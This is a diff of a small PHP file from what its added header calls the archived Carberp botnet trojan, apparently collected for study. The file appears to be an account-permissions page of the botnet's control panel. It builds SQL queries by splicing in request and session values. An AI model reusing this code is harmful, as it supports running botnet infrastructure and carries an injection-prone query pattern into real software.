@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 if(empty($Cur['id'])) $Cur['id'] = $_SESSION['user']->id;
@@ -10,10 +21,12 @@ if($Cur['id'] != $_SESSION['user']->id){
 	}
 }
 
-if(isset($_POST['save'])){	$mysqli->query("update bf_users set access='".json_encode($_POST['rights'])."' WHERE (id <> '0') AND (id='".$Cur['id']."') LIMIT 1");
+if(isset($_POST['save'])){
+	$mysqli->query("update bf_users set access='".json_encode($_POST['rights'])."' WHERE (id <> '0') AND (id='".$Cur['id']."') LIMIT 1");
 	header("Location: /accounts/");
 	exit;
-}else{	$result = $mysqli->query("SELECT * FROM bf_users WHERE (id <> '0') AND (id='".$Cur['id']."') LIMIT 1");
+}else{
+	$result = $mysqli->query("SELECT * FROM bf_users WHERE (id <> '0') AND (id='".$Cur['id']."') LIMIT 1");
 	$result->access = json_decode($result->access, true);
 	$result->config = json_decode($result->config, true);
 
